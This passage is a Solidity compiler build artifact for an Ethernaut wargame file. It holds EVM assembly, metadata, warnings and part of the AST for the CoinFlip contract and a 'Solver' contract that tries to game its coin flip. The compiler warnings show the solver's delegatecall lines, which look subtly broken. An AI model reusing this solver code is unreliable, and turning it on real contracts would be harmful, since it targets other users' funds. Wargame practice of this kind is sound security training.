											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2028,
											"end": 2219,
											"name": "tag",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 2028,
											"end": 2219,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2068,
											"end": 2072,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2088,
											"end": 2108,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "64"
										},
										{
											"begin": 2106,
											"end": 2107,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2088,
											"end": 2108,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "47"
										},
										{
											"begin": 2088,
											"end": 2108,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 2088,
											"end": 2108,
											"name": "tag",
											"source": 1,
											"value": "64"
										},
										{
											"begin": 2088,
											"end": 2108,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2083,
											"end": 2108,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2083,
											"end": 2108,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2122,
											"end": 2142,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "65"
										},
										{
											"begin": 2140,
											"end": 2141,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 2122,
											"end": 2142,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "47"
										},
										{
											"begin": 2122,
											"end": 2142,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 2122,
											"end": 2142,
											"name": "tag",
											"source": 1,
											"value": "65"
										},
										{
											"begin": 2122,
											"end": 2142,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2117,
											"end": 2142,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 2117,
											"end": 2142,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2161,
											"end": 2162,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2158,
											"end": 2159,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2155,
											"end": 2163,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 2152,
											"end": 2186,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 2152,
											"end": 2186,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "66"
										},
										{
											"begin": 2152,
											"end": 2186,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 2166,
											"end": 2184,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "67"
										},
										{
											"begin": 2166,
											"end": 2184,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "68"
										},
										{
											"begin": 2166,
											"end": 2184,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 2166,
											"end": 2184,
											"name": "tag",
											"source": 1,
											"value": "67"
										},
										{
											"begin": 2166,
											"end": 2184,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2152,
											"end": 2186,
											"name": "tag",
											"source": 1,
											"value": "66"
										},
										{
											"begin": 2152,
											"end": 2186,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2211,
											"end": 2212,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2208,
											"end": 2209,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2204,
											"end": 2213,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 2196,
											"end": 2213,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2196,
											"end": 2213,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2028,
											"end": 2219,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 2028,
											"end": 2219,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2028,
											"end": 2219,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2028,
											"end": 2219,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2028,
											"end": 2219,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2225,
											"end": 2315,
											"name": "tag",
											"source": 1,
											"value": "31"
										},
										{
											"begin": 2225,
											"end": 2315,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2259,
											"end": 2266,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2302,
											"end": 2307,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2295,
											"end": 2308,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 2288,
											"end": 2309,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 2277,
											"end": 2309,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2277,
											"end": 2309,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2225,
											"end": 2315,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2225,
											"end": 2315,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2225,
											"end": 2315,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2225,
											"end": 2315,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2321,
											"end": 2398,
											"name": "tag",
											"source": 1,
											"value": "35"
										},
										{
											"begin": 2321,
											"end": 2398,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2358,
											"end": 2365,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2387,
											"end": 2392,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2376,
											"end": 2392,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2376,
											"end": 2392,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2321,
											"end": 2398,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2321,
											"end": 2398,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2321,
											"end": 2398,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2321,
											"end": 2398,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2404,
											"end": 2481,
											"name": "tag",
											"source": 1,
											"value": "47"
										},
										{
											"begin": 2404,
											"end": 2481,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2441,
											"end": 2448,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2470,
											"end": 2475,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2459,
											"end": 2475,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2459,
											"end": 2475,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2404,
											"end": 2481,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 2404,
											"end": 2481,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2404,
											"end": 2481,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2404,
											"end": 2481,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2487,
											"end": 2794,
											"name": "tag",
											"source": 1,
											"value": "43"
										},
										{
											"begin": 2487,
											"end": 2794,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2555,
											"end": 2556,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2565,
											"end": 2678,
											"name": "tag",
											"source": 1,
											"value": "73"
										},
										{
											"begin": 2565,
											"end": 2678,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2579,
											"end": 2585,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 2576,
											"end": 2577,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2573,
											"end": 2586,
											"name": "LT",
											"source": 1
										},
										{
											"begin": 2565,
											"end": 2678,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 2565,
											"end": 2678,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "75"
										},
										{
											"begin": 2565,
											"end": 2678,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 2664,
											"end": 2665,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 2659,
											"end": 2662,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 2655,
											"end": 2666,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2649,
											"end": 2667,
											"name": "MLOAD",
											"source": 1
										},
										{
											"begin": 2645,
											"end": 2646,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2640,
											"end": 2643,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 2636,
											"end": 2647,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2629,
											"end": 2668,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2601,
											"end": 2603,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 2598,
											"end": 2599,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2594,
											"end": 2604,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2589,
											"end": 2604,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 2589,
											"end": 2604,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2565,
											"end": 2678,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "73"
										},
										{
											"begin": 2565,
											"end": 2678,
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 2565,
											"end": 2678,
											"name": "tag",
											"source": 1,
											"value": "75"
										},
										{
											"begin": 2565,
											"end": 2678,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2696,
											"end": 2702,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 2693,
											"end": 2694,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 2690,
											"end": 2703,
											"name": "GT",
											"source": 1
										},
										{
											"begin": 2687,
											"end": 2788,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 2687,
											"end": 2788,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "76"
										},
										{
											"begin": 2687,
											"end": 2788,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 2776,
											"end": 2777,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2767,
											"end": 2773,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 2762,
											"end": 2765,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 2758,
											"end": 2774,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 2751,
											"end": 2778,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2687,
											"end": 2788,
											"name": "tag",
											"source": 1,
											"value": "76"
										},
										{
											"begin": 2687,
											"end": 2788,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2536,
											"end": 2794,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2487,
											"end": 2794,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2487,
											"end": 2794,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2487,
											"end": 2794,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 2487,
											"end": 2794,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 2800,
											"end": 2980,
											"name": "tag",
											"source": 1,
											"value": "68"
										},
										{
											"begin": 2800,
											"end": 2980,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 2848,
											"end": 2925,
											"name": "PUSH",
											"source": 1,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2845,
											"end": 2846,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2838,
											"end": 2926,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2945,
											"end": 2949,
											"name": "PUSH",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 2942,
											"end": 2943,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 2935,
											"end": 2950,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 2969,
											"end": 2973,
											"name": "PUSH",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 2966,
											"end": 2967,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 2959,
											"end": 2974,
											"name": "REVERT",
											"source": 1
										},
										{
											"begin": 2986,
											"end": 3166,
											"name": "tag",
											"source": 1,
											"value": "62"
										},
										{
											"begin": 2986,
											"end": 3166,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 3034,
											"end": 3111,
											"name": "PUSH",
											"source": 1,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 3031,
											"end": 3032,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3024,
											"end": 3112,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3131,
											"end": 3135,
											"name": "PUSH",
											"source": 1,
											"value": "12"
										},
										{
											"begin": 3128,
											"end": 3129,
											"name": "PUSH",
											"source": 1,
											"value": "4"
										},
										{
											"begin": 3121,
											"end": 3136,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 3155,
											"end": 3159,
											"name": "PUSH",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 3152,
											"end": 3153,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 3145,
											"end": 3160,
											"name": "REVERT",
											"source": 1
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"solve()": "890d6908"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"solve\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"ethernaut.sol\":\"Solver\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"ethernaut.sol\":{\"keccak256\":\"0x3603274c291fc50b16feaca60d45e82373024e44ffd66ded55d4f50c4ef1c64a\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://b04c8bea2c1e2e35eea63d49c4bfb4dcbc9a5747ee8b842520ed3371d2f7cbcc\",\"dweb:/ipfs/QmTWy2bqSioebXwFghsoBtWL52o88PAWmkC5JMSU1cB2DM\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 84,
								"contract": "ethernaut.sol:Solver",
								"label": "FACTOR",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 87,
								"contract": "ethernaut.sol:Solver",
								"label": "contractAddr",
								"offset": 0,
								"slot": "1",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "2462",
				"formattedMessage": "Warning: Visibility for constructor is ignored. If you want the contract to be non-deployable, making it \"abstract\" is sufficient.\n  --> ethernaut.sol:11:3:\n   |\n11 |   constructor() public {\n   |   ^ (Relevant source part starts here and spans across multiple lines).\n\n",
				"message": "Visibility for constructor is ignored. If you want the contract to be non-deployable, making it \"abstract\" is sufficient.",
				"severity": "warning",
				"sourceLocation": {
					"end": 350,
					"file": "ethernaut.sol",
					"start": 297
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "9302",
				"formattedMessage": "Warning: Return value of low-level calls not used.\n  --> ethernaut.sol:42:13:\n   |\n42 |             contractAddr.delegatecall(abi.encode(keccak256(\"flip(bool)\"),true));\n   |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n",
				"message": "Return value of low-level calls not used.",
				"severity": "warning",
				"sourceLocation": {
					"end": 1233,
					"file": "ethernaut.sol",
					"start": 1166
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "9302",
				"formattedMessage": "Warning: Return value of low-level calls not used.\n  --> ethernaut.sol:45:13:\n   |\n45 |             contractAddr.delegatecall(abi.encode(keccak256(\"flip(bool)\"),false));\n   |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n",
				"message": "Return value of low-level calls not used.",
				"severity": "warning",
				"sourceLocation": {
					"end": 1343,
					"file": "ethernaut.sol",
					"start": 1275
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "6321",
				"formattedMessage": "Warning: Unnamed return variable can remain unassigned. Add an explicit return with value to all non-reverting code paths or name the variable.\n  --> ethernaut.sol:39:38:\n   |\n39 |     function solve() public returns (uint256) {\n   |                                      ^^^^^^^\n\n",
				"message": "Unnamed return variable can remain unassigned. Add an explicit return with value to all non-reverting code paths or name the variable.",
				"severity": "warning",
				"sourceLocation": {
					"end": 1046,
					"file": "ethernaut.sol",
					"start": 1039
				},
				"type": "Warning"
			}
		],
		"sources": {
			"ethernaut.sol": {
				"ast": {
					"absolutePath": "ethernaut.sol",
					"exportedSymbols": {
						"CoinFlip": [
							81
						],
						"Solver": [
							138
						]
					},
					"id": 139,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".7"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 81,
							"linearizedBaseContracts": [
								81
							],
							"name": "CoinFlip",
							"nameLocation": "124:8:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "e6f334d7",
									"id": 3,
									"mutability": "mutable",
									"name": "consecutiveWins",
									"nameLocation": "155:15:0",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "140:30:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 2,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "140:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 5,
									"mutability": "mutable",
									"name": "lastHash",
									"nameLocation": "183:8:0",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "175:16:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 4,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "175:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 8,
									"mutability": "mutable",
									"name": "FACTOR",
									"nameLocation": "204:6:0",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "196:94:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 6,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "196:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 7,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "213:77:0",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 15,
										"nodeType": "Block",
										"src": "318:32:0",
										"statements": [
											{
												"expression": {
													"id": 13,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 11,
														"name": "consecutiveWins",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 3,
														"src": "325:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"hexValue": "30",
														"id": 12,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "343:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "325:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 14,
												"nodeType": "ExpressionStatement",
												"src": "325:19:0"
											}
										]
									},
									"id": 16,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 9,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "308:2:0"
									},
									"returnParameters": {
										"id": 10,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "318:0:0"
									},
									"scope": 81,
									"src": "297:53:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 79,
										"nodeType": "Block",
										"src": "405:398:0",
										"statements": [
											{
												"assignments": [
													24
												],
												"declarations": [
													{
														"constant": false,
														"id": 24,
														"mutability": "mutable",
														"name": "blockValue",
														"nameLocation": "420:10:0",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "412:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 23,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "412:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 34,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 31,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"expression": {
																			"id": 28,
																			"name": "block",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967292,
																			"src": "451:5:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_block",
																				"typeString": "block"
																			}
																		},
																		"id": 29,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "number",
																		"nodeType": "MemberAccess",
																		"src": "451:12:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"hexValue": "31",
																		"id": 30,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "466:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_1_by_1",
																			"typeString": "int_const 1"
																		},
																		"value": "1"
																	},
																	"src": "451:16:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 27,
																"name": "blockhash",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967291,
																"src": "441:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																	"typeString": "function (uint256) view returns (bytes32)"
																}
															},
															"id": 32,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "441:27:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 26,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "433:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 25,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "433:7:0",
															"typeDescriptions": {}
														}
													},
													"id": 33,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "433:36:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "412:57:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 37,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 35,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "482:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 36,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "494:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "482:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 42,
												"nodeType": "IfStatement",
												"src": "478:53:0",
												"trueBody": {
													"id": 41,
													"nodeType": "Block",
													"src": "506:25:0",
													"statements": [
														{
															"expression": {
																"arguments": [],
																"expression": {
																	"argumentTypes": [],
																	"id": 38,
																	"name": "revert",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		4294967277,
																		4294967277
																	],
																	"referencedDeclaration": 4294967277,
																	"src": "515:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_revert_pure$__$returns$__$",
																		"typeString": "function () pure"
																	}
																},
																"id": 39,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "515:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 40,
															"nodeType": "ExpressionStatement",
															"src": "515:8:0"
														}
													]
												}
											},
											{
												"expression": {
													"id": 45,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 43,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "539:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 44,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "550:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "539:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 46,
												"nodeType": "ExpressionStatement",
												"src": "539:21:0"
											},
											{
												"assignments": [
													48
												],
												"declarations": [
													{
														"constant": false,
														"id": 48,
														"mutability": "mutable",
														"name": "coinFlip",
														"nameLocation": "575:8:0",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "567:16:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 47,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "567:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 52,
												"initialValue": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 51,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 49,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "586:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"id": 50,
														"name": "FACTOR",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
